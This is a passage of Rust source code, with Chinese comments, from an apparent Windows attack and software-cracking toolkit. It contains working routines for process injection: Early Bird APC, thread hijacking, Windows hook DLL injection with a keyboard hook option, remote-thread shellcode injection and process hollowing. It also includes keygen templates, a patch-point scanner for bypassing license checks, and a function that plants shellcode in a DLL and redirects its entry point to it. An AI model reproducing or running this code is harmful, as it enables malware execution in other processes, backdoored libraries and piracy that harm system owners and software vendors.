    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let file_align = u32_le(&data, opt_start + 36) as usize;
    let section_align = u32_le(&data, opt_start + 32) as usize;

    // 解析新节数据
    let sec_data = if data_or_size.len() > 2 && data_or_size.chars().all(|c| c.is_ascii_hexdigit() || c == ' ') {
        hex_to_bytes(data_or_size)?
    } else if let Ok(sz) = data_or_size.parse::<usize>() {
        vec![0u8; sz]
    } else {
        return Err("数据格式无效: 需HEX或十进制大小".into());
    };

    if sec_name.len() > 8 { return Err("节名≤8字符".into()); }
    let mut name_bytes = [0u8; 8];
    for (i, b) in sec_name.as_bytes().iter().take(8).enumerate() { name_bytes[i] = *b; }

    // 计算新节位置
    let last_sec = sec_start + (num_sections - 1) * 40;
    let last_vaddr = u32_le(&data, last_sec + 12) as usize;
    let last_vsize = u32_le(&data, last_sec + 8) as usize;
    let last_roff = u32_le(&data, last_sec + 20) as usize;
    let last_rsize = u32_le(&data, last_sec + 16) as usize;

    let new_vaddr = ((last_vaddr + last_vsize + section_align - 1) / section_align) * section_align;
    let new_roff = ((last_roff + last_rsize + file_align - 1) / file_align) * file_align;
    let raw_size = ((sec_data.len() + file_align - 1) / file_align) * file_align;
    let virt_size = ((sec_data.len() + section_align - 1) / section_align) * section_align;

    // 扩展文件
    let required = new_roff + raw_size;
    if required > data.len() { data.resize(required, 0); }
    data[new_roff..new_roff+sec_data.len()].copy_from_slice(&sec_data);

    // 写入新节表条目
    let new_sec_off = sec_start + num_sections * 40;
    if new_sec_off + 40 > data.len() { data.resize(new_sec_off + 40, 0); }
    data[new_sec_off..new_sec_off+8].copy_from_slice(&name_bytes);
    data[new_sec_off+8..new_sec_off+12].copy_from_slice(&(virt_size as u32).to_le_bytes());
    data[new_sec_off+12..new_sec_off+16].copy_from_slice(&(new_vaddr as u32).to_le_bytes());
    data[new_sec_off+16..new_sec_off+20].copy_from_slice(&(raw_size as u32).to_le_bytes());
    data[new_sec_off+20..new_sec_off+24].copy_from_slice(&(new_roff as u32).to_le_bytes());
    // Characteristics: MEM_EXECUTE|MEM_READ|CNT_CODE = 0x60000020
    let chars: u32 = 0x60000020;
    data[new_sec_off+36..new_sec_off+40].copy_from_slice(&chars.to_le_bytes());

    // 更新PE头
    let new_num = (num_sections + 1) as u16;
    data[coff+2..coff+4].copy_from_slice(&new_num.to_le_bytes());
    let new_image = (new_vaddr + virt_size) as u32;
    data[opt_start+56..opt_start+60].copy_from_slice(&new_image.to_le_bytes());

    std::fs::write(path, &data).map_err(|e| format!("写入失败: {}", e))?;

    Ok(format!("═══ 节添加完成 ═══\n  文件: {}\n  备份: {}\n  节名: {}\n  VA: 0x{:08X}\n  VSize: {}B\n  ROff: 0x{:08X}\n  RSize: {}B\n  特征: 0x{:08X} (RX)\n  [+] 节已添加 — 可用 dll_disasm 反汇编新节",
        path, bak, sec_name, new_vaddr, virt_size, new_roff, raw_size, chars))
}

// ═══════════════ Keygen模板 v3.4 ═══════════════

fn keygen_template(algo: &str, output_dir: Option<&str>) -> Result<String, String> {
    let out_dir = output_dir.unwrap_or(".");
    let out_path = std::path::Path::new(out_dir);
    let _ = std::fs::create_dir_all(out_path);

    let (code, ext) = match algo {
        "serial" => (
            r#"// serial_keygen.c — 用户名→序列号 Keygen 模板
// 编译: gcc -o keygen.exe serial_keygen.c
#include <stdio.h>
#include <string.h>
#include <ctype.h>

// [!] 替换为逆向出的算法
unsigned long generate_serial(const char* username) {
    unsigned long serial = 0xDEADBEEF;
    for (int i = 0; username[i]; i++) {
        serial = (serial << 5) + serial + toupper(username[i]);
        serial ^= 0x12345678;
    }
    return serial & 0xFFFFFFFF;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("用法: %s <用户名>\n", argv[0]);
        return 1;
    }
    unsigned long serial = generate_serial(argv[1]);
    printf("用户名: %s\n", argv[1]);
    printf("序列号: %08lX-%04lX\n", serial >> 16, serial & 0xFFFF);
    return 0;
}
"#, "c"),
        "hwid" => (
            r#"// hwid_keygen.c — 硬件ID→激活码 Keygen
#include <stdio.h>
#include <string.h>

// HWID格式通常: XXXX-XXXX-XXXX-XXXX (16字节hex)
void generate_activation(const char* hwid, char* out) {
    unsigned char key[16];
    // 从HWID计算密钥
    for (int i = 0; i < 16; i++) {
        unsigned int byte_val;
        sscanf(hwid + i*2, "%2x", &byte_val);
        key[i] = (unsigned char)(byte_val ^ 0xAA ^ (i * 7));
    }
    sprintf(out, "%02X%02X%02X%02X-%02X%02X%02X%02X-%02X%02X%02X%02X-%02X%02X%02X%02X",
        key[0],key[1],key[2],key[3],key[4],key[5],key[6],key[7],
        key[8],key[9],key[10],key[11],key[12],key[13],key[14],key[15]);
}

int main(int argc, char** argv) {
    if (argc < 2) { printf("用法: %s <HWID>\n", argv[0]); return 1; }
    char activation[64];
    generate_activation(argv[1], activation);
    printf("HWID: %s\n激活码: %s\n", argv[1], activation);
    return 0;
}
"#, "c"),
        "rsa" => (
            r#"#!/usr/bin/env python3
# rsa_keygen.py — RSA密钥替换 Keygen
# 方法: 用自己的RSA密钥对替换程序中的公钥, 用私钥签名许可证

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
import base64, sys

def generate_keys():
    """生成RSA密钥对"""
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    priv_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    pub_der = public_key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return priv_pem, pub_der

def sign_license(private_key, data):
    """用私钥签名"""
    signature = private_key.sign(data.encode(), padding.PKCS1v15(), hashes.SHA256())
    return base64.b64encode(signature).decode()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <用户名>")
        sys.exit(1)
    priv, pub = generate_keys()
    print("=== RSA密钥对 ===\n")
    print(f"[私钥 - 安全保存]:\n{priv.decode()}")
    print(f"[公钥DER - 替换到程序中]:\n{pub.hex()}\n")
    license_data = f"USER={sys.argv[1]};EXPIRY=2099-12-31"
    sig = sign_license(priv if isinstance(priv, rsa.RSAPrivateKey) else serialization.load_pem_private_key(priv, None), license_data)
    print(f"许可证: {base64.b64encode(license_data.encode()).decode()}.{sig}")
"#, "py"),
        _ => (
            r#"#!/usr/bin/env python3
# custom_keygen.py — 自定义算法Keygen模板
import sys

def validate(serial):
    """逆向分析得到的验证逻辑"""
    if len(serial) != 19: return False
    parts = serial.split('-')
    if len(parts) != 4: return False
    # 算法...
    return True

def generate(username):
    """生成有效序列号"""
    # 逆向得到的生成算法
    import hashlib
    h = hashlib.md5(username.encode()).hexdigest().upper()
    return f"{h[0:4]}-{h[4:8]}-{h[8:12]}-{h[12:16]}"

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <用户名>")
        sys.exit(1)
    serial = generate(sys.argv[1])
    print(f"用户: {sys.argv[1]}\n序列号: {serial}")
    print(f"验证: {'✓ 有效' if validate(serial) else '✗ 无效'}")
"#, "py"),
    };

    let fname = out_path.join(format!("keygen_{}.{}", algo, ext));
    std::fs::write(&fname, code).map_err(|e| format!("写入失败: {}", e))?;

    Ok(format!("═══ Keygen模板生成 ═══\n  算法: {}\n  输出: {}\n\n[!] 需要逆向目标程序的验证逻辑:\n  1. dll_disasm 反汇编验证函数\n  2. dll_cryptoscan 检测加密算法\n  3. 将逆向得到的算法填入keygen模板\n  4. 编译: gcc keygen_serial.c -o keygen.exe",
        algo, fname.display()))
}

// ═══════════════ 补丁模式搜索 v3.4 ═══════════════

fn patch_search(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    let mut out = format!("═══ 补丁模式搜索: {} ═══\n\n", path);

    // 搜索可被NOP/反转的常见验证模式
    let mut candidates: Vec<(usize, String, &str, &str)> = Vec::new();

    // 模式1: TEST eax,eax; JZ → NOP JZ = 永远通过
    // 85 C0 74 XX
    for i in 0..data.len().saturating_sub(4) {
        if data[i] == 0x85 && data[i+1] == 0xC0 && data[i+2] == 0x74 {
            candidates.push((i, "85 C0 74".into(), "TEST EAX,EAX; JZ → NOP JZ(EB+2=0x90 0x90)", "反转向/NOP"));
        }
        if data[i] == 0x85 && data[i+1] == 0xC0 && data[i+2] == 0x75 {
            candidates.push((i, "85 C0 75".into(), "TEST EAX,EAX; JNZ → NOP JNZ", "反转向/NOP"));
        }
        // 83 F8 00 74 — CMP EAX,0; JZ
        if data[i] == 0x83 && data[i+1] == 0xF8 && data[i+2] == 0x00 && data[i+3] == 0x74 {
            candidates.push((i, "83 F8 00 74".into(), "CMP EAX,0; JZ → NOP JZ", "反转向/NOP"));
        }
        // 83 F8 00 75 — CMP EAX,0; JNZ
        if data[i] == 0x83 && data[i+1] == 0xF8 && data[i+2] == 0x00 && data[i+3] == 0x75 {
            candidates.push((i, "83 F8 00 75".into(), "CMP EAX,0; JNZ → NOP JNZ", "反转向/NOP"));
        }
        // 33 C0 — XOR EAX,EAX (归零 → 改为 MOV EAX,1 / B8 01 00 00 00)
        if data[i] == 0x33 && data[i+1] == 0xC0 {
            candidates.push((i, "33 C0".into(), "XOR EAX,EAX → MOV EAX,1 (B8 01 00 00 00)", "返回值改为1"));
        }
        // 83 F8 01 7C — CMP EAX,1; JL
        if i+5 < data.len() && data[i] == 0x83 && data[i+1] == 0xF8 && data[i+2] == 0x01 && data[i+3] >= 0x7C && data[i+3] <= 0x7F {
            let desc = format!("83 F8 01 {:02X}", data[i+3]);
            candidates.push((i, desc, "CMP EAX,1; Jcc → 反转条件", "反转向"));
        }
    }

    // 限制输出
    if candidates.len() > 80 {
        candidates.truncate(80);
        out.push_str("[!] 候选过多, 截断到80条\n\n");
    }

    if candidates.is_empty() {
        out.push_str("[·] 未找到明显补丁模式\n");
    } else {
        out.push_str("─── 可补丁位置 ───\n");
        out.push_str("  偏移       字节          含义                        操作\n");
        for (off, bytes, desc, action) in &candidates {
            out.push_str(&format!("  0x{:08X}  {:12}  {:40}  {}\n", off, bytes, desc, action));
        }
        out.push_str(&format!("\n[+] {} 个候选补丁位置\n", candidates.len()));
        out.push_str("\n[*] 典型破解操作:\n");
        out.push_str("  - nop <path> <offset> 2  (NOP掉条件跳转=永远通过)\n");
        out.push_str("  - jmp_invert <path> <offset>  (反转条件=绕过检查)\n");
    }

    Ok(out)
}

// ═══════════════ 函数Hook v3.4 ═══════════════

fn func_hook(pid_str: &str, func_spec: &str, shellcode_hex: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    // 解析 func_spec: "module!function"
    let (mod_name, func_name) = match func_spec.split_once('!') {
        Some((m, f)) => (m, f),
        None => return Err("格式: module.dll!FunctionName".into()),
    };

    let (mod_base, _mod_size, _) = find_module_info(pid, mod_name)?;

    // 获取函数地址
    let func_addr = {
        let h_mod = unsafe { LoadLibraryA(mod_name.as_ptr() as *const u8) };
        if h_mod.is_null() { return Err(format!("无法加载{}", mod_name)); }
        let addr = unsafe { GetProcAddress(h_mod, func_name.as_ptr() as *const u8) };
        if addr.is_null() { return Err(format!("未找到函数: {}", func_name)); }
        let rva = addr as usize - h_mod as usize;
        mod_base as usize + rva
    };

    let shellcode = if shellcode_hex == "log" {
        // 生成日志stub: pushad/push参数/call OutputDebugString/popad/原序言/jmp返回
        vec![0xCC] // placeholder — 实际需要完整stub
    } else {
        hex_to_bytes(shellcode_hex)?
    };

    let mut out = format!("═══ 函数Hook安装 ═══\n\n");
    out.push_str(&format!("[·] PID: {} | 模块: {} | 函数: {}\n", pid, mod_name, func_name));
    out.push_str(&format!("[·] 函数地址: 0x{:016X}\n", func_addr));
    out.push_str(&format!("[·] Shellcode: {}B\n\n", shellcode.len()));

    let h_proc = unsafe { OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程: {}", w32_err()));
    }

    // 读取原始函数序言(保存用于恢复)
    let prologue_size = shellcode.len().min(16);
    let mut orig_bytes = vec![0u8; prologue_size];
    let mut bytes_read: usize = 0;
    let ret = unsafe { ReadProcessMemory(h_proc, func_addr as LPVOID, orig_bytes.as_mut_ptr() as LPVOID, prologue_size, &mut bytes_read) };
    if ret == 0 { unsafe { CloseHandle(h_proc); } return Err(format!("读取函数失败: {}", w32_err())); }

    // 修改内存保护
    let mut old_prot: DWORD = 0;
    unsafe { VirtualProtectEx(h_proc, func_addr as LPVOID, prologue_size, PAGE_EXECUTE_READWRITE, &mut old_prot); }

    // 写入shellcode
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, func_addr as LPVOID, shellcode.as_ptr() as LPVOID, shellcode.len(), &mut written) };
    unsafe { CloseHandle(h_proc); }

    if ret == 0 {
        return Err(format!("WriteProcessMemory: {}", w32_err()));
    }

    let orig_hex: String = orig_bytes.iter().map(|b| format!("{:02X}", b)).collect::<Vec<_>>().join(" ");
    out.push_str(&format!("[+] Hook已安装!\n"));
    out.push_str(&format!("[·] 原始序言: {}\n", orig_hex));
    out.push_str(&format!("[·] 已写入: {}B\n", written));
    out.push_str("[!] 恢复: mem_write <pid> <addr> \"原始序言HEX\"\n");

    Ok(out)
}

// ═══════════════ Early Bird APC注入 v4.1 ═══════════════

fn inject_early_bird(exe_path: &str, payload: &str) -> Result<String, String> {
    let sc = resolve_payload(payload)?;
    let mut si: win32::STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: win32::PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<win32::STARTUPINFOA>() as u32;

    let exe_c = CString::new(exe_path).map_err(|_| "路径无效")?;
    let ret = unsafe {
        win32::CreateProcessA(std::ptr::null(), exe_c.as_ptr() as *mut u8, std::ptr::null_mut(), std::ptr::null_mut(),
            0, 0x00000004, std::ptr::null_mut(), std::ptr::null(), &mut si, &mut pi)
    };
    if ret == 0 { return Err(format!("CreateProcess失败: {}", w32_err())); }

    let h_proc = pi.hProcess;
    let h_thread = pi.hThread;
    let pid = pi.dwProcessId;

    // Allocate RWX
    let remote = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), sc.len(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote.is_null() { unsafe { win32::TerminateProcess(h_proc, 0); win32::CloseHandle(h_proc); win32::CloseHandle(h_thread); } return Err("VirtualAllocEx失败".into()); }

    let mut written = 0usize;
    unsafe { WriteProcessMemory(h_proc, remote, sc.as_ptr() as LPVOID, sc.len(), &mut written); }

    // Queue APC to main thread
    let apc_ret = unsafe { QueueUserAPC(remote as FARPROC, h_thread, remote as ULONG_PTR) };
    if apc_ret == 0 { unsafe { win32::TerminateProcess(h_proc, 0); win32::CloseHandle(h_proc); win32::CloseHandle(h_thread); } return Err("QueueUserAPC失败".into()); }

    // Resume thread — APC fires immediately
    unsafe { win32::ResumeThread(h_thread); }
    unsafe { win32::CloseHandle(h_thread); win32::CloseHandle(h_proc); }

    Ok(format!("═══ Early Bird APC注入完成 ═══\n  EXE: {}\n  PID: {}\n  Shellcode: {}B @{:p}\n  [+] APC已排队 — shellcode将在main之前执行!", exe_path, pid, sc.len(), remote))
}

// ═══════════════ 线程劫持注入 v4.1 ═══════════════

fn inject_thread_hijack(pid_str: &str, shellcode_hex: &str, tid_str: Option<&str>) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok()).ok_or("无效PID")?;
    let sc = resolve_payload(shellcode_hex)?;

    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE { return Err(format!("OpenProcess: {}", w32_err())); }

    // Find thread
    let tid = if let Some(ts) = tid_str {
        ts.parse::<u32>().map_err(|_| "无效TID")?
    } else {
        // Find first thread belonging to this process
        let h_snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
        let mut te: THREADENTRY32 = unsafe { std::mem::zeroed() };
        te.dw_size = std::mem::size_of::<THREADENTRY32>() as u32;
        let mut found_tid = 0u32;
        unsafe { Thread32First(h_snap, &mut te); }
        loop {
            if te.th32_owner_process_id == pid { found_tid = te.th32_thread_id; break; }
            if unsafe { Thread32Next(h_snap, &mut te) } == 0 { break; }
        }
        unsafe { CloseHandle(h_snap); }
        if found_tid == 0 { unsafe { CloseHandle(h_proc); } return Err("找不到目标线程".into()); }
        found_tid
    };

    let h_thread = unsafe { OpenThread(THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT, 0, tid) };
    if h_thread.is_null() || h_thread == INVALID_HANDLE_VALUE { unsafe { CloseHandle(h_proc); } return Err("OpenThread失败".into()); }

    // Suspend + get context + modify RIP
    unsafe { win32::SuspendThread(h_thread); }

    let is_x64 = {
        let mut is_wow = 0i32;
        unsafe { win32::IsWow64Process(h_proc, &mut is_wow); }
        std::mem::size_of::<usize>() == 8 && is_wow == 0
    };

    // Allocate RWX in target
    let remote = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), sc.len(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote.is_null() { unsafe { win32::ResumeThread(h_thread); CloseHandle(h_thread); CloseHandle(h_proc); } return Err("VirtualAllocEx".into()); }
    let mut written = 0usize;
    unsafe { WriteProcessMemory(h_proc, remote, sc.as_ptr() as LPVOID, sc.len(), &mut written); }

    // Get thread context and set RIP
    if is_x64 {
        let mut ctx: win32::CONTEXT64 = unsafe { std::mem::zeroed() };
        ctx.ContextFlags = 0x100000; // CONTEXT_CONTROL
        unsafe { win32::GetThreadContext(h_thread, &mut ctx as *mut _ as *mut std::os::raw::c_void); }
        ctx.Rip = remote as u64;
        unsafe { win32::SetThreadContext(h_thread, &ctx as *const _ as *const std::os::raw::c_void); }
    } else {
        let mut ctx: win32::CONTEXT32 = unsafe { std::mem::zeroed() };
        ctx.ContextFlags = 0x10001; // CONTEXT_CONTROL
        unsafe { win32::GetThreadContext(h_thread, &mut ctx as *mut _ as *mut std::os::raw::c_void); }
        ctx.Eip = remote as u32;
        unsafe { win32::SetThreadContext(h_thread, &ctx as *const _ as *const std::os::raw::c_void); }
    }

    unsafe { win32::ResumeThread(h_thread); CloseHandle(h_thread); CloseHandle(h_proc); }

    Ok(format!("═══ 线程劫持完成 ═══\n  PID: {}  TID: {}\n  RIP→0x{:016X}\n  Shellcode: {}B\n  [+] 线程恢复后将立即执行shellcode!",
        pid, tid, remote as usize, sc.len()))
}

// ═══════════════ Windows Hook注入 v4.1 ═══════════════

fn inject_windows_hook(dll_path: &str, hook_type: &str) -> Result<String, String> {
    let dll_abs = std::fs::canonicalize(dll_path).map_err(|e| format!("DLL路径: {}", e))?;
    let dll_str = dll_abs.to_string_lossy();
    if !std::path::Path::new(&*dll_str).exists() { return Err("DLL不存在".into()); }

    let h_mod = unsafe { LoadLibraryA(dll_str.as_ptr()) };
    if h_mod.is_null() { return Err("无法加载DLL".into()); }

    // 需要DLL导出标准钩子过程: 通常为 HookProc 或 DllMain
    let proc_name = CString::new("HookProc").unwrap_or_default();
    let hook_proc = unsafe { GetProcAddress(h_mod, proc_name.as_ptr() as *const u8) };
    if hook_proc.is_null() {
        // Fallback: create a minimal hook proc
        unsafe { win32::FreeLibrary(h_mod); }
        return Err("DLL需要导出 HookProc 函数. 使用 dll_spike_proxy 生成带HookProc的代理DLL".into());
    }

    let hook_id: i32 = match hook_type {
        "keyboard" => 2,  // WH_KEYBOARD
        "cbt"      => 5,  // WH_CBT
        "getmsg"   => 3,  // WH_GETMESSAGE
        "shell"    => 10, // WH_SHELL
        _ => 2,
    };

    let h_hook = unsafe { win32::SetWindowsHookExA(hook_id, hook_proc as FARPROC, h_mod, 0) };
    if h_hook.is_null() {
        unsafe { win32::FreeLibrary(h_mod); }
        return Err(format!("SetWindowsHookEx: {}", w32_err()));
    }

    Ok(format!("═══ Windows Hook注入已安装 ═══\n  DLL: {}\n  钩子类型: {}\n  Hook句柄: {:p}\n  [+] 目标进程触发消息时将自动加载DLL\n  [!] 保持进程运行以维持钩子: 使用 exec_bg 后台运行",
        dll_str, hook_type, h_hook))
}

// ═══════════════ 原始代码注入 v4.1 ═══════════════

fn code_inject_raw(pid_str: &str, payload: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok()).ok_or("无效PID")?;
    let sc = resolve_payload(payload)?;

    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE { return Err(format!("OpenProcess: {}", w32_err())); }

    let remote = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), sc.len(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote.is_null() { unsafe { CloseHandle(h_proc); } return Err("VirtualAllocEx".into()); }

    let mut written = 0usize;
    unsafe { WriteProcessMemory(h_proc, remote, sc.as_ptr() as LPVOID, sc.len(), &mut written); }
    if written != sc.len() { unsafe { VirtualFreeEx(h_proc, remote, 0, 0x8000); CloseHandle(h_proc); } return Err("WriteMemory".into()); }

    let h_thread = unsafe { CreateRemoteThread(h_proc, std::ptr::null_mut(), 0, remote as LPTHREAD_START_ROUTINE, std::ptr::null_mut(), 0, std::ptr::null_mut()) };
    if h_thread.is_null() { unsafe { VirtualFreeEx(h_proc, remote, 0, 0x8000); CloseHandle(h_proc); } return Err("CreateRemoteThread".into()); }

    unsafe { WaitForSingleObject(h_thread, 5000); CloseHandle(h_thread); CloseHandle(h_proc); }

    Ok(format!("═══ 代码注入完成 ═══\n  PID: {}\n  Shellcode: {}B @{:p}\n  [+] 远程线程已执行", pid, sc.len(), remote))
}

// ═══════════════ Process Hollowing v4.1 ═══════════════

fn process_hollow(target_exe: &str, repl_pe: &str) -> Result<String, String> {
    let repl_data = std::fs::read(repl_pe).map_err(|e| format!("读取PE: {}", e))?;
    if repl_data.len() < 64 || u16_le(&repl_data, 0) != 0x5A4D { return Err("无效替换PE".into()); }

    let mut si: win32::STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: win32::PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<win32::STARTUPINFOA>() as u32;
    let exe_c = CString::new(target_exe).unwrap_or_default();
    let ret = unsafe {
        win32::CreateProcessA(std::ptr::null(), exe_c.as_ptr() as *mut u8, std::ptr::null_mut(), std::ptr::null_mut(),
            0, 0x00000004, std::ptr::null_mut(), std::ptr::null(), &mut si, &mut pi)
    };
    if ret == 0 { return Err(format!("CreateProcess: {}", w32_err())); }

    let h_proc = pi.hProcess;
    let h_thread = pi.hThread;

    // Get original image base
    let mut ctx: win32::CONTEXT64 = unsafe { std::mem::zeroed() };
    ctx.ContextFlags = 0x100000;
    unsafe { win32::GetThreadContext(h_thread, &mut ctx as *mut _ as *mut std::os::raw::c_void); }
    let orig_base = (ctx.Rdx as usize) + 16; // PEB→ImageBase offset in x64

    // Read ImageBase from PEB
    let mut image_base: usize = 0;
    let mut br = 0usize;
    unsafe { ReadProcessMemory(h_proc, orig_base as LPVOID, &mut image_base as *mut _ as LPVOID, 8, &mut br); }

    // NtUnmapViewOfSection — use syscall stub pattern
    // Simplified: we write replacement PE to a new location and update PEB
    let pe_off = u32_le(&repl_data, 0x3C) as usize;
    let opt_start = pe_off + 4 + 20;
    let repl_image_size = u32_le(&repl_data, opt_start + 56) as usize;
    let repl_entry = u32_le(&repl_data, opt_start + 16) as usize;

    let remote = unsafe { VirtualAllocEx(h_proc, image_base as LPVOID, repl_image_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote.is_null() {
        // Base address taken, allocate anywhere
        let remote = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), repl_image_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
        if remote.is_null() { unsafe { win32::TerminateProcess(h_proc,0); CloseHandle(h_proc); CloseHandle(h_thread); } return Err("Alloc fail".into()); }
        // Write PE headers
        let hdr_size = u32_le(&repl_data, opt_start + 60) as usize;
        unsafe { WriteProcessMemory(h_proc, remote, repl_data.as_ptr() as LPVOID, hdr_size.min(repl_data.len()), &mut br); }
        // Write sections
        let ns = u16_le(&repl_data, pe_off+4+2) as usize;
        let ss = pe_off+4+20+u16_le(&repl_data, pe_off+4+16) as usize;
        for i in 0..ns {
            let o = ss + i*40;
            let ro = u32_le(&repl_data, o+20) as usize;
            let rs = u32_le(&repl_data, o+16) as usize;
            let va = u32_le(&repl_data, o+12) as usize;
            if rs > 0 && ro+rs <= repl_data.len() {
                let dst = remote as usize + va;
                unsafe { WriteProcessMemory(h_proc, dst as LPVOID, repl_data[ro..ro+rs].as_ptr() as LPVOID, rs, &mut br); }
            }
        }
        // Update context RIP to new entry
        ctx.Rip = remote as u64 + repl_entry as u64;
        unsafe { win32::SetThreadContext(h_thread, &ctx as *const _ as *const std::os::raw::c_void); }
    }

    unsafe { win32::ResumeThread(h_thread); CloseHandle(h_thread); CloseHandle(h_proc); }

    Ok(format!("═══ Process Hollowing完成 ═══\n  容器: {}\n  替换PE: {}\n  PID: {}\n  [+] 目标进程已恢复, 将执行替换PE", target_exe, repl_pe, pi.dwProcessId))
}

// ═══════════════ DLL加料 v4.1 ═══════════════

fn resolve_payload(payload: &str) -> Result<Vec<u8>, String> {
    // 可能是HEX、mbox、cmd、calc、DLL路径
    if payload == "mbox" || payload == "msgbox" { return Ok(MSGBOX_X64.to_vec()); }
    if payload == "cmd" { return Ok(CMD_X64.to_vec()); }
    if payload == "calc" { return Ok(vec![0xCC, 0xCC, 0xCC]); } // 占位
    if std::path::Path::new(payload).exists() && payload.ends_with(".dll") {
        // DLL path → generate LoadLibrary shellcode (simplified: return DLL path as hex)
        return Err("DLL路径需转换: 使用 dll_shellcode 生成LoadLibrary stub".into());
    }
    hex_to_bytes(payload)
}

fn dll_spike_cmd(dll_path: &str, shellcode_hex: &str, output: Option<&str>) -> Result<String, String> {
    let mut data = std::fs::read(dll_path).map_err(|e| format!("读取: {}", e))?;
    let sc = resolve_payload(shellcode_hex)?;
    let bak = format!("{}.spike_bak", dll_path);
    std::fs::copy(dll_path, &bak).map_err(|e| format!("备份: {}", e))?;

    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("非PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let entry_rva = if is_x64 { u64_le(&data, opt_start + 16) } else { u32_le(&data, opt_start + 16) as u64 };
    let section_align = u32_le(&data, opt_start + 32) as usize;
    let file_align = u32_le(&data, opt_start + 36) as usize;

    // Add .spike section with shellcode (reuse section_add logic simplified)
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let last = sec_start + (num_sections - 1) * 40;
    let lvaddr = u32_le(&data, last + 12) as usize;
    let lvsize = u32_le(&data, last + 8) as usize;
    let lroff = u32_le(&data, last + 20) as usize;
    let lrsize = u32_le(&data, last + 16) as usize;

    let new_va = ((lvaddr + lvsize + section_align - 1) / section_align) * section_align;
    let new_roff = ((lroff + lrsize + file_align - 1) / file_align) * file_align;
    let raw_sz = ((sc.len() + file_align - 1) / file_align) * file_align;
    let virt_sz = ((sc.len() + section_align - 1) / section_align) * section_align;

    let req = new_roff + raw_sz;
    if req > data.len() { data.resize(req, 0); }
    data[new_roff..new_roff+sc.len()].copy_from_slice(&sc);

    // Write section header
    let nso = sec_start + num_sections * 40;
    if nso + 40 > data.len() { data.resize(nso + 40, 0); }
    let name = b".spike\0\0";
    data[nso..nso+8].copy_from_slice(name);
    data[nso+8..nso+12].copy_from_slice(&(virt_sz as u32).to_le_bytes());
    data[nso+12..nso+16].copy_from_slice(&(new_va as u32).to_le_bytes());
    data[nso+16..nso+20].copy_from_slice(&(raw_sz as u32).to_le_bytes());
    data[nso+20..nso+24].copy_from_slice(&(new_roff as u32).to_le_bytes());
    data[nso+36..nso+40].copy_from_slice(&0xE0000020u32.to_le_bytes()); // RXW

    // Update PE header
    data[coff+2..coff+4].copy_from_slice(&((num_sections+1) as u16).to_le_bytes());
    data[opt_start+56..opt_start+60].copy_from_slice(&((new_va + virt_sz) as u32).to_le_bytes());

    // Patch DllMain: insert JMP to shellcode at entry
    // We need to save original entry bytes and write JMP
    let entry_off = {
        let ns2 = u16_le(&data, coff + 2) as usize;
        let mut off = None;
        for i in 0..ns2 {
            let o = sec_start + i*40;
            let va = u32_le(&data, o+12);
            let vs = u32_le(&data, o+8);
            let ro = u32_le(&data, o+20);
            let rs = u32_le(&data, o+16);
            if entry_rva >= va as u64 && entry_rva < va as u64 + vs as u64 && rs > 0 {
                off = Some((ro as usize + (entry_rva as usize - va as usize)) as usize); break;
            }
        }
        off
    };

    if let Some(ep) = entry_off {
        // Save original 5 bytes, write JMP rel32 to .spike section
        let jmp_target = new_va as u64;
        let jmp_rel = jmp_target as i64 - (entry_rva as i64 + 5);
